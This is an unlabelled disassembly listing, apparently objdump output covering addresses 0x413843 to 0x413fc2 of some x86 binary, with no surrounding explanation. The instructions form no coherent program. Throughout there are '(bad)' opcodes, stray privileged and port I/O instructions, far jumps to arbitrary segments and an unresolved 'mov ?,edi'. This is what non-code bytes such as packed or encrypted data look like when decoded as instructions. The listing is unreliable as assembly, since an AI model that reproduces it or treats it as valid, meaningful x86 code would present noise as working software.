  413843:	xchg   edi,eax
  413844:	imul   edi,eax,0xa
  413847:	push   es
  413848:	test   DWORD PTR [ecx+eiz*4-0x30953989],eax
  41384f:	pop    eax
  413850:	ins    DWORD PTR es:[edi],dx
  413851:	jmp    0x4b5097aa
  413856:	cmp    BYTE PTR [ecx-0x56],ah
  413859:	or     ebp,DWORD PTR [ebx]
  41385b:	lods   eax,DWORD PTR ds:[esi]
  41385c:	sahf   
  41385d:	gs scas al,BYTE PTR es:[edi]
  41385f:	jmp    0x3db6ba5a
  413864:	push   0x28
  413866:	jns    0x41386c
  413868:	cwde   
  413869:	ins    DWORD PTR es:[edi],dx
  41386a:	in     eax,0x8c
  41386c:	cmp    DWORD PTR [edi+ebx*4+0x264d68b],ecx
  413873:	cli    
  413874:	push   edi
  413875:	add    ah,BYTE PTR [eax+0x286f2de1]
  41387b:	push   esi
  41387c:	das    
  41387d:	xchg   esp,eax
  41387e:	cmc    
  41387f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413880:	mov    eax,ds:0x3678c19
  413885:	dec    edx
  413886:	outs   dx,BYTE PTR ds:[esi]
  413887:	cwde   
  413888:	add    bl,cl
  41388a:	in     al,0x5b
  41388c:	cmp    ch,BYTE PTR [ebx+0x49]
  41388f:	pop    edx
  413890:	retf   0xf12e
  413893:	xchg   edi,eax
  413894:	ins    DWORD PTR es:[edi],dx
  413895:	push   ds
  413896:	into   
  413897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413898:	ins    DWORD PTR es:[edi],dx
  413899:	fldcw  WORD PTR [esi]
  41389b:	loop   0x413912
  41389d:	repz ret 
  41389f:	xchg   ah,ch
  4138a1:	ins    DWORD PTR es:[edi],dx
  4138a2:	add    BYTE PTR [edi],cl
  4138a4:	rcr    dh,0xd3
  4138a7:	(bad)  
  4138a8:	stc    
  4138a9:	fisub  WORD PTR [esi+ebp*1+0x213ab8e7]
  4138b0:	jae    0x413863
  4138b2:	xlat   BYTE PTR ds:[ebx]
  4138b3:	loopne 0x4138d6
  4138b5:	push   es
  4138b6:	stos   BYTE PTR es:[edi],al
  4138b7:	(bad)  
  4138b8:	aad    0xe0
  4138ba:	push   ecx
  4138bb:	cli    
  4138bc:	mov    al,ds:0xfc9c4c77
  4138c1:	ins    BYTE PTR es:[edi],dx
  4138c2:	test   BYTE PTR [ebx-0x7e11e65e],bh
  4138c8:	mov    esi,0xd9f034bf
  4138cd:	pop    ecx
  4138ce:	jmp    0x9fdc2171
  4138d3:	xchg   esi,eax
  4138d4:	mov    dh,bl
  4138d6:	sbb    ch,BYTE PTR [ecx]
  4138d8:	mov    eax,0x257c7d73
  4138dd:	or     DWORD PTR es:[edi],esi
  4138e0:	(bad)  
  4138e1:	arpl   WORD PTR [edx],ax
  4138e3:	fwait
  4138e4:	pop    ebx
  4138e5:	and    al,0xfa
  4138e7:	sti    
  4138e8:	mov    cl,0x59
  4138ea:	pop    edi
  4138eb:	fbstp  TBYTE PTR [edx+0x11]
  4138ee:	rol    BYTE PTR [ecx-0xff813d5],1
  4138f4:	xor    cl,BYTE PTR [esi]
  4138f6:	xchg   BYTE PTR [ebx-0x50b312b4],cl
  4138fc:	repz adc esi,DWORD PTR [ebp+0x6a19a48e]
  413903:	cli    
  413904:	cmp    eax,DWORD PTR [edx-0x33]
  413907:	push   ebx
  413908:	sbb    al,0xc2
  41390a:	aas    
  41390b:	mov    bh,0x9
  41390d:	push   es
  41390e:	cmp    eax,0xb6267e31
  413913:	das    
  413914:	enter  0xc19e,0x8f
  413918:	ror    BYTE PTR [ecx],cl
  41391a:	push   ds
  41391b:	loope  0x41398f
  41391d:	sub    ebx,edx
  41391f:	sub    al,BYTE PTR [edx+esi*8+0x4103c6eb]
  413926:	mov    ch,0xa1
  413928:	add    eax,0x79836a17
  41392d:	inc    esp
  41392e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41392f:	cwde   
  413930:	and    eax,0x293a43cb
  413935:	pop    es
  413936:	adc    dl,BYTE PTR [edi-0x62]
  413939:	aad    0x6e
  41393b:	shl    DWORD PTR [ecx],0x31
  41393e:	ficom  DWORD PTR [ebx+0xf1b7f2f]
  413944:	adc    eax,0x4c9dc5b0
  413949:	stos   BYTE PTR es:[edi],al
  41394a:	je     0x413935
  41394c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41394d:	mov    ecx,0x5a9c2324
  413952:	push   cs
  413953:	push   edi
  413954:	addr16 xor esi,esi
  413957:	sub    al,0x1e
  413959:	movlps xmm6,QWORD PTR [esi+0x69da1c1b]
  413960:	es test eax,0xc1c0642
  413966:	aam    0x10
  413968:	sahf   
  413969:	inc    edi
  41396a:	aas    
  41396b:	cwde   
  41396c:	stc    
  41396d:	daa    
  41396e:	test   DWORD PTR [edx+0x1c3fa548],ebx
  413974:	jp     0x413913
  413976:	retf   0xcecf
  413979:	or     DWORD PTR [edx],eax
  41397b:	(bad)  [ecx+0x7fd38283]
  413981:	fldenv [ebp-0x17]
  413984:	mov    ebp,0xf43eff70
  413989:	rsm    
  41398b:	int    0xee
  41398d:	jle    0x413955
  41398f:	jno    0x4139a3
  413991:	mov    ?,edi
  413993:	mov    edx,0x2d94279d
  413998:	loopne 0x413a17
  41399a:	pop    ebp
  41399b:	xor    BYTE PTR [ebp+eiz*2+0x6945c461],dl
  4139a2:	fmulp  st(1),st
  4139a4:	xor    bl,bh
  4139a6:	pusha  
  4139a7:	adc    eax,0xab0f89c8
  4139ac:	push   esp
  4139ad:	lahf   
  4139ae:	clc    
  4139af:	mov    edi,0x95166d3d
  4139b4:	aas    
  4139b5:	ror    BYTE PTR [ebx],0xad
  4139b8:	cmp    ch,BYTE PTR [esi+0x42]
  4139bb:	outs   dx,DWORD PTR ds:[esi]
  4139bc:	leave  
  4139bd:	pop    ebp
  4139be:	es hlt 
  4139c0:	nop
  4139c1:	inc    edi
  4139c2:	jo     0x413a11
  4139c4:	jle    0x413a27
  4139c6:	and    cl,BYTE PTR [esi]
  4139c8:	pop    ss
  4139c9:	and    BYTE PTR [eax],ch
  4139cb:	and    esp,DWORD PTR [ebx-0x53]
  4139ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139cf:	dec    esp
  4139d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139d1:	mov    al,ds:0x3afda773
  4139d6:	lods   eax,DWORD PTR ds:[esi]
  4139d7:	shr    DWORD PTR [esp+ecx*2],0x12
  4139db:	lods   al,BYTE PTR ds:[esi]
  4139dc:	inc    eax
  4139dd:	shl    al,1
  4139df:	nop
  4139e0:	jl     0x4139a3
  4139e2:	cwde   
  4139e3:	jno    0x413a5b
  4139e5:	inc    eax
  4139e6:	loop   0x4139cf
  4139e8:	sbb    al,0x10
  4139ea:	sbb    bl,al
  4139ec:	sbb    al,0xdb
  4139ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ef:	psraw  mm0,QWORD PTR [eax-0x68]
  4139f3:	je     0x413a24
  4139f5:	mov    ebp,0x5e06975
  4139fa:	pop    edi
  4139fb:	sbb    BYTE PTR [edi],ah
  4139fd:	mov    ebx,0xe3078a49
  413a02:	xor    eax,0xd93fcc5a
  413a07:	push   0x50519d0d
  413a0c:	in     eax,dx
  413a0d:	mov    dl,0xa1
  413a0f:	mov    dl,0x85
  413a11:	sbb    esi,ebp
  413a13:	loop   0x413a30
  413a15:	mov    ecx,0x22d6b5df
  413a1a:	xor    DWORD PTR [eax-0x59],ecx
  413a1d:	aad    0x9a
  413a1f:	mov    ebx,0xd3782de
  413a24:	fisttp DWORD PTR [edx+ecx*8+0x622df4a0]
  413a2b:	and    BYTE PTR [edi],bh
  413a2d:	sbb    DWORD PTR [edx],ecx
  413a2f:	mov    dl,0x1d
  413a31:	leave  
  413a32:	xchg   cl,ch
  413a34:	add    bh,BYTE PTR [edi]
  413a36:	dec    ecx
  413a37:	and    bl,cl
  413a39:	mov    WORD PTR [ecx],ss
  413a3b:	js     0x413a3e
  413a3d:	pop    ds
  413a3e:	jno    0x4139fe
  413a40:	outs   dx,BYTE PTR ds:[esi]
  413a41:	out    0x33,eax
  413a43:	ret    
  413a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a45:	xor    esi,ebp
  413a47:	mov    ch,0xff
  413a49:	lods   eax,DWORD PTR ds:[esi]
  413a4a:	enter  0xdcd2,0xa7
  413a4e:	xchg   edi,eax
  413a4f:	test   al,al
  413a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a52:	mov    bl,0xc4
  413a54:	retf   
  413a55:	pop    eax
  413a56:	pop    ds
  413a57:	out    0x59,eax
  413a59:	test   eax,0xab8b6af6
  413a5e:	sub    cl,BYTE PTR [ecx+0x4bf407d7]
  413a64:	add    esi,DWORD PTR [ecx]
  413a66:	ja     0x413aad
  413a68:	call   FWORD PTR [ecx+esi*8]
  413a6b:	pop    es
  413a6c:	inc    edi
  413a6d:	ja     0x413a35
  413a6f:	push   eax
  413a70:	mov    ds:0x191a8717,eax
  413a75:	loopne 0x413ad8
  413a77:	retf   0xfde8
  413a7a:	and    eax,0x590770e1
  413a7f:	pop    ecx
  413a80:	jb     0x413acc
  413a82:	int    0x34
  413a84:	sub    eax,0x1d2192bf
  413a89:	push   ebx
  413a8a:	mov    edi,0x1dbfd33b
  413a8f:	jmp    0x3876:0x9d9b830c
  413a96:	btc    DWORD PTR [esi-0x714fcdf8],edi
  413a9d:	sbb    eax,0x891e2ca
  413aa2:	mov    eax,ds:0x762de273
  413aa7:	mov    ds:0x36bcb5c7,al
  413aac:	cli    
  413aad:	mov    dh,0xc6
  413aaf:	or     al,0xde
  413ab1:	ins    BYTE PTR es:[edi],dx
  413ab2:	mov    DWORD PTR [edx+ecx*4],edx
  413ab5:	xor    DWORD PTR [edx],ecx
  413ab7:	div    BYTE PTR [ecx+0x6a0ba7d2]
  413abd:	call   eax
  413abf:	and    esi,eax
  413ac1:	(bad)  
  413ac2:	sbb    bh,dh
  413ac4:	les    edi,FWORD PTR [ebx+0x39]
  413ac7:	daa    
  413ac8:	adc    eax,0x3da72ed
  413acd:	sub    eax,0x4ae2821b
  413ad2:	gs mov ecx,0x541939ab
  413ad8:	dec    eax
  413ad9:	adc    al,0x3e
  413adb:	iret   
  413adc:	dec    esp
  413add:	dec    BYTE PTR [ebx+ecx*4-0x124feb28]
  413ae4:	adc    BYTE PTR [edi],bh
  413ae6:	and    dh,0x32
  413ae9:	(bad)  [esi-0x667bcfdc]
  413aef:	xchg   edx,eax
  413af0:	adc    eax,0x37f93f9c
  413af5:	push   es
  413af6:	and    cl,BYTE PTR [edi-0x1c273322]
  413afc:	stos   BYTE PTR es:[edi],al
  413afd:	adc    al,0x1a
  413aff:	xor    edi,DWORD PTR [edi-0x5346b513]
  413b05:	sti    
  413b06:	ss sti 
  413b08:	push   ecx
  413b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b0a:	adc    esp,DWORD PTR [ecx-0x41ba1614]
  413b10:	mov    dh,0x61
  413b12:	rol    DWORD PTR [ecx],1
  413b14:	add    eax,0xfbba953f
  413b19:	fldenv [edx-0x571aef64]
  413b1f:	sar    DWORD PTR [edi+ecx*8-0x87c37d1],0xcd
  413b27:	xor    eax,DWORD PTR [edx]
  413b29:	cmp    al,0xe7
  413b2b:	add    DWORD PTR [edi-0x11],0x12
  413b2f:	mov    ds:0xc72ba1ae,eax
  413b34:	enter  0xb20,0xb0
  413b38:	ficomp DWORD PTR [ebx-0x28]
  413b3b:	outs   dx,DWORD PTR ds:[esi]
  413b3c:	mov    al,ds:0xc6a8d608
  413b41:	mov    BYTE PTR [ebx],dh
  413b43:	pop    edx
  413b44:	cmp    eax,0x297fe792
  413b49:	aas    
  413b4a:	jno    0x413b75
  413b4c:	cmc    
  413b4d:	test   al,0x1b
  413b4f:	popa   
  413b50:	enter  0xbe32,0x9a
  413b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b55:	add    cl,BYTE PTR [eax-0x4e5d199d]
  413b5b:	push   ebx
  413b5c:	and    BYTE PTR [esi-0x2a5b7d9f],dl
  413b62:	mov    cl,ch
  413b64:	pop    ebx
  413b65:	push   es
  413b66:	and    ebp,ebx
  413b68:	in     eax,0x18
  413b6a:	xor    dl,BYTE PTR [ebp-0x17fa449c]
  413b70:	add    DWORD PTR [ebp+0x62],ecx
  413b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b74:	mov    dl,0x23
  413b76:	jp     0x413b7b
  413b78:	mov    ebp,0x1579d17c
  413b7d:	pop    es
  413b7e:	sub    ah,BYTE PTR [eax-0x44]
  413b81:	adc    esi,ebp
  413b83:	cs push edx
  413b85:	jb     0x413b1d
  413b87:	inc    esi
  413b88:	push   es
  413b89:	outs   dx,BYTE PTR ds:[esi]
  413b8a:	adc    eax,0x54070634
  413b8f:	adc    ecx,ebp
  413b91:	shr    DWORD PTR [ebx],0xd9
  413b94:	leave  
  413b95:	and    al,0xac
  413b97:	daa    
  413b98:	lahf   
  413b99:	inc    edi
  413b9a:	or     DWORD PTR [eax+0x6c],edi
  413b9d:	inc    ebx
  413b9e:	sbb    dh,BYTE PTR [edx]
  413ba0:	jns    0x413bc4
  413ba2:	push   0x4a299215
  413ba7:	out    0x6c,al
  413ba9:	aam    0xc8
  413bab:	imul   eax,DWORD PTR [ebx+0x6548666f],0xb4b373e7
  413bb5:	add    ebx,DWORD PTR [ebx-0x5752561c]
  413bbb:	in     al,dx
  413bbc:	jno    0x413c03
  413bbe:	xchg   edi,eax
  413bbf:	into   
  413bc0:	lock push esi
  413bc2:	retf   
  413bc3:	test   eax,0xcc7747a
  413bc8:	jmp    0x168b8636
  413bcd:	sub    eax,0xcf2cd64e
  413bd2:	sahf   
  413bd3:	mov    esp,0xd182461d
  413bd8:	pop    esi
  413bd9:	sbb    ecx,ebx
  413bdb:	fisubr DWORD PTR [esi-0x2c591901]
  413be1:	push   0x6df5dd11
  413be6:	fdiv   DWORD PTR [ecx+esi*2-0xc408bd6]
  413bed:	push   es
  413bee:	sub    ah,BYTE PTR [ebp-0x41]
  413bf1:	fimul  DWORD PTR [esi]
  413bf3:	out    0xdc,al
  413bf5:	ss adc eax,0x2ff415a6
  413bfb:	aas    
  413bfc:	xlat   BYTE PTR ds:[ebx]
  413bfd:	and    BYTE PTR [ecx+0x33e19626],ch
  413c03:	aad    0xd8
  413c05:	or     ebp,ecx
  413c07:	icebp  
  413c08:	lea    ecx,[ecx-0x79866b9f]
  413c0e:	cld    
  413c0f:	mov    ebx,0x9cf40d4d
  413c14:	inc    edi
  413c15:	or     al,0x3a
  413c17:	mov    esp,DWORD PTR [edi]
  413c19:	push   cs
  413c1a:	das    
  413c1b:	jo     0x413c8f
  413c1d:	sub    bl,al
  413c1f:	sti    
  413c20:	out    dx,al
  413c21:	or     al,0x72
  413c23:	mov    ch,0x6f
  413c25:	add    dh,al
  413c27:	(bad)  
  413c28:	jnp    0x413c9a
  413c2a:	fisub  WORD PTR [edi-0x127161c5]
  413c30:	daa    
  413c31:	push   DWORD PTR [ebx-0x3f]
  413c34:	push   ebp
  413c35:	pusha  
  413c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c37:	mov    edx,0xf677de1c
  413c3c:	arpl   WORD PTR [esi-0x2e],sp
  413c3f:	cmp    eax,0x39709548
  413c44:	push   ebx
  413c45:	xchg   DWORD PTR [ecx+0x3d6d3fd1],ebx
  413c4b:	xchg   ebx,eax
  413c4c:	mov    ss,WORD PTR [edi+eax*4-0x35]
  413c50:	cmp    cl,cl
  413c52:	leave  
  413c53:	rol    BYTE PTR [eax],0x6b
  413c56:	out    dx,eax
  413c57:	or     DWORD PTR [edi],ebx
  413c59:	std    
  413c5a:	ret    
  413c5b:	pop    ebx
  413c5c:	sub    esi,DWORD PTR [ebx]
  413c5e:	dec    ecx
  413c5f:	out    0x14,al
  413c61:	xchg   BYTE PTR [esi+edi*8+0x7cead8be],bh
  413c68:	xchg   esi,eax
  413c69:	repz arpl WORD PTR [edx+0x57],sp
  413c6d:	not    DWORD PTR [esi+0x60414532]
  413c73:	mov    ch,0x5d
  413c75:	mov    ecx,0xd76b873c
  413c7a:	call   0xff3f:0x31dab171
  413c81:	inc    ecx
  413c82:	sbb    ecx,ecx
  413c84:	retf   
  413c85:	cmp    BYTE PTR [edx-0x16],bl
  413c88:	jl     0x413c5f
  413c8a:	in     eax,0x18
  413c8c:	scas   al,BYTE PTR es:[edi]
  413c8d:	loop   0x413cd1
  413c8f:	mov    dh,0x7b
  413c91:	popa   
  413c92:	mov    bl,0x66
  413c94:	mov    BYTE PTR [ebx],bh
  413c96:	adc    BYTE PTR [ecx+0x64],bh
  413c99:	and    BYTE PTR [edx-0x17],ah
  413c9c:	scas   al,BYTE PTR es:[edi]
  413c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c9e:	cld    
  413c9f:	sbb    dl,BYTE PTR [ecx+0x26c5066d]
  413ca5:	inc    edx
  413ca6:	add    al,0x1d
  413ca8:	imul   ecx,DWORD PTR [edx-0x36],0x532801c3
  413caf:	shl    DWORD PTR [edx+esi*2],0x86
  413cb3:	mov    ds:0x3e6b28fc,eax
  413cb8:	retf   0x49d3
  413cbb:	stos   BYTE PTR es:[edi],al
  413cbc:	popa   
  413cbd:	scas   eax,DWORD PTR es:[edi]
  413cbe:	inc    edi
  413cbf:	mov    ds:0xa4296da2,eax
  413cc4:	mov    ds,WORD PTR [edi+edi*1+0x1c]
  413cc8:	jmp    0x413ca3
  413cca:	gs pop ss
  413ccc:	xor    al,0x3a
  413cce:	inc    ebx
  413ccf:	jns    0x413cfb
  413cd1:	or     al,0x2e
  413cd3:	sbb    DWORD PTR [edi+eax*2-0x68],eax
  413cd7:	mov    ecx,DWORD PTR [edi+ebp*4+0x3267c251]
  413cde:	xor    al,0x92
  413ce0:	icebp  
  413ce1:	out    dx,eax
  413ce2:	mov    cs,WORD PTR [bp+di+0x56]
  413ce6:	add    DWORD PTR [edx-0x4d360ba7],ebp
  413cec:	je     0x413c89
  413cee:	stos   BYTE PTR es:[edi],al
  413cef:	stc    
  413cf0:	pusha  
  413cf1:	add    ah,BYTE PTR ss:[esi+0x739ec641]
  413cf8:	mov    ebp,0x4b15980e
  413cfd:	inc    esi
  413cfe:	sar    DWORD PTR [edi],1
  413d00:	shl    DWORD PTR [esi],1
  413d02:	and    esi,DWORD PTR [ebx-0x7309facc]
  413d08:	inc    ecx
  413d09:	pop    esp
  413d0a:	sti    
  413d0b:	ficom  WORD PTR [edi]
  413d0d:	imul   edi,DWORD PTR [edi-0x5e],0xb50cd930
  413d14:	sub    bl,bh
  413d16:	dec    ebx
  413d17:	jno    0x413d50
  413d19:	push   esp
  413d1a:	dec    ecx
  413d1b:	jl     0xe755d280
  413d21:	pop    eax
  413d22:	rcr    esp,1
  413d24:	sahf   
  413d25:	push   edx
  413d26:	ss and eax,ebp
  413d29:	add    BYTE PTR [edx-0x52],bh
  413d2c:	pop    eax
  413d2d:	pop    ebp
  413d2e:	sbb    ah,al
  413d30:	sub    BYTE PTR [eax+0x10],dh
  413d33:	fwait
  413d34:	sub    DWORD PTR [edx+esi*1],0x72
  413d38:	sub    dl,0xc9
  413d3b:	inc    ebp
  413d3c:	fdiv   st(1),st
  413d3e:	sbb    al,0x5b
  413d40:	test   al,0x6b
  413d42:	mov    bh,0x8d
  413d44:	daa    
  413d45:	jnp    0x413db5
  413d47:	sub    ebx,DWORD PTR [edx]
  413d49:	and    eax,0x452bc352
  413d4e:	clc    
  413d4f:	xchg   bl,ch
  413d51:	sbb    eax,0x12f3d8e1
  413d56:	inc    edx
  413d57:	jae    0x413d08
  413d59:	ins    DWORD PTR es:[edi],dx
  413d5a:	aas    
  413d5b:	mov    ds:0xd66f3349,eax
  413d60:	ds stos BYTE PTR es:[edi],al
  413d62:	mov    dl,0x3d
  413d64:	jle    0x413ce9
  413d66:	inc    esp
  413d67:	(bad)  
  413d69:	and    al,0xbe
  413d6b:	enter  0xfbef,0xb4
  413d6f:	lock cwde 
  413d71:	sub    al,0x24
  413d73:	(bad)  
  413d75:	pop    ds
  413d76:	retf   
  413d77:	lods   eax,DWORD PTR ds:[esi]
  413d78:	out    0xa4,al
  413d7a:	je     0x413d31
  413d7c:	xchg   ecx,eax
  413d7d:	push   ebx
  413d7e:	(bad)  
  413d7f:	mov    eax,0xd078e3c4
  413d84:	(bad)  
  413d85:	and    al,0x95
  413d87:	or     ebp,DWORD PTR [edi+esi*2]
  413d8a:	aad    0xc9
  413d8c:	lock jmp 0x413d2b
  413d8f:	popf   
  413d90:	loopne 0x413d37
  413d92:	aaa    
  413d93:	xor    eax,0xbcd04437
  413d98:	(bad)  
  413d99:	jg     0x413dab
  413d9b:	adc    BYTE PTR [ebx],dh
  413d9d:	inc    ebx
  413d9e:	jecxz  0x413d2c
  413da0:	xchg   edx,eax
  413da1:	jmp    0x413da2
  413da3:	sbb    BYTE PTR [ebp-0x5],ah
  413da6:	mov    ds:0x44f25a87,eax
  413dab:	pop    es
  413dac:	mov    eax,ds:0xf91f3b64
  413db1:	push   es
  413db2:	loopne 0x413d65
  413db4:	sbb    BYTE PTR ds:0x6d59dc7c,cl
  413dba:	mov    DWORD PTR [ebp+0x59],ecx
  413dbd:	xor    BYTE PTR [eax-0x61],al
  413dc0:	push   es
  413dc1:	aam    0xb
  413dc3:	mov    esp,0xfcd1a9ac
  413dc8:	xor    eax,0x765825af
  413dcd:	pop    es
  413dce:	retf   
  413dcf:	xchg   ebp,eax
  413dd0:	stos   BYTE PTR es:[edi],al
  413dd1:	pop    ebp
  413dd2:	xchg   esp,eax
  413dd3:	jns    0x413e4c
  413dd5:	pushf  
  413dd6:	inc    esi
  413dd7:	sub    BYTE PTR [eax-0x4f],0x85
  413ddb:	mov    edx,0x30ba4b3c
  413de0:	push   eax
  413de1:	sub    DWORD PTR [eax],0xb75f67a
  413de7:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de9:	inc    ebp
  413dea:	outs   dx,DWORD PTR ds:[esi]
  413deb:	(bad)  
  413dec:	jp     0x413d86
  413dee:	mov    ch,BYTE PTR [ebp+0x21740ee8]
  413df4:	inc    ecx
  413df5:	ja     0x413d88
  413df7:	cmp    BYTE PTR [edx+0x31e364cf],0x3
  413dfe:	ds mov edx,0xe90196b8
  413e04:	jns    0x413e14
  413e06:	addr16 iret 
  413e08:	mov    eax,0x437474be
  413e0d:	shr    BYTE PTR [eax-0x16],0xdb
  413e11:	and    ebx,ebp
  413e13:	out    0xe7,eax
  413e15:	sub    ah,ah
  413e17:	rcr    DWORD PTR [edx+0x7443105b],1
  413e1d:	push   edi
  413e1e:	rcr    dl,0x38
  413e21:	add    ecx,DWORD PTR [ebp-0xe]
  413e24:	cmp    BYTE PTR [ebp-0x76],cl
  413e27:	sbb    al,0xaf
  413e29:	push   edx
  413e2a:	xor    eax,0x66a816b
  413e2f:	sub    ah,0xd6
  413e32:	jmp    0x413ea1
  413e34:	dec    ebx
  413e35:	inc    esi
  413e36:	push   cs
  413e37:	inc    ecx
  413e38:	das    
  413e39:	test   BYTE PTR [esi],dl
  413e3b:	adc    cl,BYTE PTR [eax-0x11]
  413e3e:	cdq    
  413e3f:	call   0xbd45:0x65d89e46
  413e46:	aaa    
  413e47:	mov    ds:0xb35f0360,eax
  413e4c:	hlt    
  413e4d:	ret    
  413e4e:	mov    dl,0xd1
  413e50:	leave  
  413e51:	push   edi
  413e52:	das    
  413e53:	sbb    eax,0x9791dd77
  413e58:	(bad)  
  413e59:	cdq    
  413e5a:	pop    ebp
  413e5b:	inc    eax
  413e5c:	repz or edi,DWORD PTR [edi-0x2b]
  413e60:	sub    al,0x91
  413e62:	stos   BYTE PTR es:[edi],al
  413e63:	or     ecx,DWORD PTR ds:0xdf3fc1f2
  413e69:	xchg   ecx,eax
  413e6a:	add    al,0x98
  413e6c:	inc    edi
  413e6d:	ins    BYTE PTR es:[edi],dx
  413e6e:	jmp    0x1211a539
  413e73:	push   edi
  413e74:	scas   eax,DWORD PTR es:[edi]
  413e75:	and    ch,dh
  413e77:	mov    bl,0x8a
  413e79:	push   ebx
  413e7a:	sbb    BYTE PTR [ecx+0x1c8a09d0],ch
  413e80:	xchg   ebp,eax
  413e81:	mov    DWORD PTR [edx-0x3d],ecx
  413e84:	push   esi
  413e85:	jg     0x413e2b
  413e87:	(bad)  
  413e88:	xchg   esi,eax
  413e89:	or     BYTE PTR [ebx],0x45
  413e8c:	jne    0x413e2e
  413e8e:	jp     0x413f09
  413e90:	push   0xd85c764b
  413e95:	push   0x1
  413e97:	mov    ebx,ebp
  413e99:	std    
  413e9a:	jns    0x413eb6
  413e9c:	xor    ebx,edi
  413e9e:	jle    0x413ef3
  413ea0:	add    al,0xf0
  413ea2:	addr16 gs out dx,eax
  413ea5:	cmp    dh,BYTE PTR [ebx]
  413ea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ea8:	jg     0x413f17
  413eaa:	mov    al,ds:0x406378cc
  413eaf:	mov    ebp,0xe58921fe
  413eb4:	cwde   
  413eb5:	sar    DWORD PTR [ebx],0xc6
  413eb8:	sahf   
  413eb9:	mov    ebx,DWORD PTR [edx+0x72]
  413ebc:	xor    al,0x5f
  413ebe:	sub    dh,BYTE PTR [eax]
  413ec0:	dec    ebx
  413ec1:	aam    0x4d
  413ec3:	dec    ebp
  413ec4:	lods   eax,DWORD PTR ds:[esi]
  413ec5:	mov    bh,0xc6
  413ec7:	push   edi
  413ec8:	xchg   BYTE PTR [esi-0x2f6759fe],al
  413ece:	mov    edx,0x66196231
  413ed3:	jne    0x413ed5
  413ed5:	xchg   edx,eax
  413ed6:	out    0x5e,al
  413ed8:	dec    esi
  413ed9:	dec    edi
  413eda:	pop    ss
  413edb:	dec    ebp
  413edc:	ins    DWORD PTR es:[edi],dx
  413edd:	pop    esp
  413ede:	inc    edx
  413edf:	inc    ebp
  413ee0:	test   eax,0x6a75eb8d
  413ee5:	and    ebp,ecx
  413ee7:	push   es
  413ee8:	or     al,0x7
  413eea:	(bad)  
  413eeb:	aam    0x34
  413eed:	adc    eax,0xe0049dca
  413ef2:	cmp    edi,esi
  413ef4:	or     al,0x20
  413ef6:	mov    edx,0x5e0cffcd
  413efb:	mov    WORD PTR [edi],ss
  413efd:	clc    
  413efe:	ror    esi,1
  413f00:	repz pushf 
  413f02:	jae    0x413f6c
  413f04:	imul   ebp,DWORD PTR [edx-0x70],0xffffff81
  413f08:	loop   0x413ebe
  413f0a:	(bad)  
  413f0c:	aas    
  413f0d:	mov    bh,0x9c
  413f0f:	pop    esi
  413f10:	call   0x724eb162
  413f15:	inc    edx
  413f16:	(bad)  
  413f17:	sub    bh,BYTE PTR [eax+0xd]
  413f1a:	lds    ecx,FWORD PTR ds:0x14d254eb
  413f20:	xchg   ebx,eax
  413f21:	and    al,0xde
  413f23:	jle    0x413f9c
  413f25:	loopne 0x413ede
  413f27:	push   ebp
  413f28:	stos   BYTE PTR es:[edi],al
  413f29:	outs   dx,DWORD PTR ds:[esi]
  413f2a:	ss push esi
  413f2c:	fst    QWORD PTR [esi]
  413f2e:	test   al,0xf5
  413f30:	js     0x413f45
  413f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f33:	repz ds adc cl,ch
  413f37:	ret    
  413f38:	sahf   
  413f39:	xchg   ebx,eax
  413f3a:	(bad)
  413f3d:	inc    esp
  413f3e:	outs   dx,BYTE PTR ds:[esi]
  413f3f:	mov    esi,0xc2dd3ddd
  413f44:	mov    edx,0xc55ed696
  413f49:	fs leave 
  413f4b:	fwait
  413f4c:	daa    
  413f4d:	push   cs
  413f4e:	xchg   BYTE PTR [esi+0x50],bh
  413f51:	push   edx
  413f52:	cdq    
  413f53:	adc    eax,0x5f50eceb
  413f58:	adc    bh,bh
  413f5a:	dec    esi
  413f5b:	cdq    
  413f5c:	jne    0x413f81
  413f5e:	jl     0x413f17
  413f60:	test   al,0xd7
  413f62:	add    edx,DWORD PTR [ebp-0x7a]
  413f65:	(bad)  
  413f66:	leave  
  413f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f68:	stos   BYTE PTR es:[edi],al
  413f69:	sbb    al,0x34
  413f6b:	jne    0x413f8c
  413f6d:	add    edx,esp
  413f6f:	push   eax
  413f70:	gs adc cl,0x33
  413f74:	mov    cl,0xea
  413f76:	ret    
  413f77:	jp     0x413fec
  413f79:	pop    ss
  413f7a:	aas    
  413f7b:	adc    eax,0x5d996f50
  413f80:	imul   edx,DWORD PTR [ebx+0x5b57323b],0xebc557d3
  413f8a:	ins    DWORD PTR es:[edi],dx
  413f8b:	pop    edx
  413f8c:	adc    DWORD PTR [esi-0x22],esp
  413f8f:	inc    edx
  413f90:	aam    0xce
  413f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f93:	adc    bh,BYTE PTR [ebx+0x732b7e59]
  413f99:	stc    
  413f9a:	xchg   edi,eax
  413f9b:	ret    
  413f9c:	popa   
  413f9d:	jg     0x413f73
  413f9f:	repz push ds
  413fa1:	pop    es
  413fa2:	inc    edi
  413fa3:	out    0xc5,eax
  413fa5:	push   0x5c658361
  413faa:	or     ch,BYTE PTR [edx]
  413fac:	fdivr  QWORD PTR [eax+0x2a]
  413faf:	jecxz  0x413fa1
  413fb1:	test   al,0x5f
  413fb3:	dec    esp
  413fb4:	dec    edx
  413fb5:	mov    cl,0xc6
  413fb7:	or     BYTE PTR [ebp-0x4f889170],al
  413fbd:	xor    eax,0x46189a3a
  413fc2:	out    dx,al
